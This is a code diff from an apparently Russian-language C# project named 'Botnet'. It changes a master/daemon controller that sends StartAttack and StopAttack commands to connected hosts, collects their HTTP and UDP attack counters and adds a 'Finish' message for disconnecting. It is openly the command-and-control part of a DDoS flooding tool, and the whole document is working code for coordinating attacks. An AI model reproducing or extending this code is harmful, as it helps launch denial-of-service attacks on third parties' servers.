@@ -14,7 +14,8 @@ namespace Botnet
             Params,
             StartAttack,
             StopAttack,
-            StatisticMessageRequest
+            StatisticMessageRequest,
+            Finish
 
         }
         /// <summary>
@@ -25,7 +26,7 @@ namespace Botnet
             public int id;
             public UInt32 HttpCounter;
             public UInt32 UdpCounter;
-            public TcpClient Client; 
+            public TcpClient Client;
             public ControllerState state;
             public Daemon(TcpClient handler, ControllerState curstate)
             {
@@ -71,7 +72,7 @@ namespace Botnet
             /// <param name="daemon">Новый хост/param>
             public new void Add(string key, Daemon daemon)
             {
-               if(ContainsKey(key))
+                if (ContainsKey(key))
                 {
                     Remove(key);
                 }
@@ -94,7 +95,10 @@ namespace Botnet
             {
                 if (ContainsKey(Id))
                 {
-                    this[Id].Client.GetStream().Close();
+                    if (this[Id].Client.Connected)
+                    {
+                        this[Id].Client.GetStream().Close();
+                    }
                     this[Id].Client.Close();
                     base.Remove(Id);
                 }
@@ -226,23 +230,42 @@ namespace Botnet
         {
             TcpClient Connection = Params as TcpClient;
             string key = ((IPEndPoint)(Connection.Client.RemoteEndPoint)).ToString();
-            string hostname = Daemons[key].ToString(); 
+            string hostname = Daemons[key].ToString();
             UpdateData(hostname + " Присоединился");   ///index!!!
             NetworkStream Stream = Connection.GetStream();
             Connection.ReceiveBufferSize = 1000;
             Connection.ReceiveTimeout = 200;
             byte[] buffer = new byte[9];
+            bool DataCollected;
+            bool Finished = false;
             try
             {
-                while (Connection.Connected)
+                while (Connection.Connected && !Finished)
                 {
-                    if (Connection.Available >= 9)
+                    DataCollected = false;
+                    if (Connection.Available >= 1)
                     {
-                        Stream.Read(buffer, 0, 9);
-                        UInt32 Http = BitConverter.ToUInt32(buffer, 1);
-                        UInt32 Udp = BitConverter.ToUInt32(buffer, 5);
-                        Daemons.addStat(key, Http, Udp);
-                        ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter + Daemons.getTotalHttp(), Core.UdpCounter + Daemons.getTotalUdp());
+                        int code = Stream.ReadByte();
+                        switch (code)
+                        {
+                            case (int)MessageCode.StatisticMessageRequest:
+                                while (Connection.Connected && !DataCollected)
+                                {
+                                    if (Connection.Available >= 8)
+                                    {
+                                        DataCollected = true;
+                                        Stream.Read(buffer, 0, 8);
+                                        UInt32 Http = BitConverter.ToUInt32(buffer, 0);
+                                        UInt32 Udp = BitConverter.ToUInt32(buffer, 4);
+                                        Daemons.addStat(key, Http, Udp);
+                                        ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter + Daemons.getTotalHttp(), Core.UdpCounter + Daemons.getTotalUdp());
+                                    }
+                                }
+                                break;
+                            case (int)MessageCode.Finish:
+                                Finished = true;
+                                break;
+                        }
 
                     }
                 }
@@ -250,9 +273,9 @@ namespace Botnet
             catch (ObjectDisposedException)
             {
                 return;
-            } 
+            }
             UpdateData(hostname + " Отсоединился");
-            Daemons.Remove(key); 
+            Daemons.Remove(key);
         }
         /// <summary>
         /// ПОддерживает соединение хоста с мастером
@@ -270,11 +293,12 @@ namespace Botnet
                 Connection.ReceiveTimeout = 100;
                 NetworkStream Stream = Connection.GetStream();
                 bool DataCollected;
+                bool Finished = false;
                 UInt32 oldHttpCount = 0;
                 UInt32 oldUdpCount = 0;
                 UInt32 newHttpCount;
                 UInt32 newUdpCount;
-                while (Connection.Connected)
+                while (Connection.Connected && !Finished)
                 {
                     DataCollected = false;
                     if (Connection.Available >= 1)
@@ -282,7 +306,7 @@ namespace Botnet
                         int code = Stream.ReadByte();
                         switch (code)
                         {
-                            case 0:
+                            case (int)MessageCode.Params:
                                 while (Connection.Connected && !DataCollected)
                                 {
                                     if (Connection.Available >= 2)
@@ -306,13 +330,13 @@ namespace Botnet
                                     }
                                 }
                                 break;
-                            case 1:
+                            case (int)MessageCode.StartAttack:
                                 AttackIsAllowed = true;
                                 Start(); break;
-                            case 2:
+                            case (int)MessageCode.StopAttack:
                                 AttackIsAllowed = false;
                                 Stop(); break;
-                            case 3:
+                            case (int)MessageCode.StatisticMessageRequest:
                                 List<byte> msgs = new List<byte>();
                                 msgs.Add(3);
                                 newHttpCount = Core.HttpCounter;
@@ -323,10 +347,17 @@ namespace Botnet
                                 oldUdpCount = newUdpCount;
                                 Stream.Write(msgs.ToArray(), 0, msgs.Count);
                                 break;
+                            case (int)MessageCode.Finish:
+                                Finished = true;
+                                break;
                         }
                     }
                 }
                 UpdateData("Соединение с мастером разорвано");
+                state = ControllerState.Error;
+                Stream.Close();
+                HostClient.Close();
+
             }
             catch (SocketException err)
             {
@@ -366,7 +397,7 @@ namespace Botnet
         /// </summary>
         private void SendStartSignal()
         {
-            foreach(Daemon host in Daemons.Values) //TODO: Возможно нужно заблокировать этот участок, писали что словарь не мультипоточный
+            foreach (Daemon host in Daemons.Values) //TODO: Возможно нужно заблокировать этот участок, писали что словарь не мультипоточный
             {
                 if (host.state == ControllerState.Suspending)
                 {
@@ -510,7 +541,7 @@ namespace Botnet
             {
                 Stop();
             }
-            if ((al_port != CurrentPort) || (Adapter.Id != this.Adapter.Id) || ((MasterPoint != null) && (!MasterPoint.Equals(Master))) || ((MasterPoint == null) && (Master != null)))
+            if ((al_port != CurrentPort) || (Adapter.Id != this.Adapter.Id) || ((MasterPoint != null) && (!MasterPoint.Equals(Master) || HostClient != null)) || ((MasterPoint == null) && (Master != null)))
             {
                 Close();
                 UpdateData("Инициализация клиентов");
@@ -521,6 +552,7 @@ namespace Botnet
                     this.Adapter = Adapter;
                     if (MasterPoint == null)
                     {
+                        Master = null;
                         mode = true;
                         InitServer();
                         //ChangeMode(true);
@@ -634,7 +666,7 @@ namespace Botnet
                     }
                     else
                     {
-                        UpdateData("выбранный порт занят");
+                        UpdateData("Выбранный порт занят");
                     }
                     //state = ControllerState.Error; 
                 }
@@ -691,7 +723,7 @@ namespace Botnet
             if (!mode) throw new Exception(); //if daemon mode its invalid cast
             string[] info = new string[Daemons.Count];
             int i = 0;
-            foreach(Daemon host in Daemons.Values)
+            foreach (Daemon host in Daemons.Values)
             {
                 info[i] = host.ToString();
                 ++i;
@@ -709,8 +741,9 @@ namespace Botnet
             {
                 if (Server != null)
                 {
-                    foreach(Daemon host in Daemons.Values)
+                    foreach (Daemon host in Daemons.Values)
                     {
+                        SendServiceMessage(MessageCode.Finish, host.Client);
                         host.Client.GetStream().Close();
                         host.Client.Close();
                     }
@@ -724,11 +757,12 @@ namespace Botnet
                 {
                     if ((HostClient.Client != null) && (HostClient.Connected))
                     {
+                        SendServiceMessage(MessageCode.Finish, HostClient);
                         HostClient.GetStream().Close();
                     }
                     HostClient.Close();
                 }
             }
         }
-    } 
+    }
 }
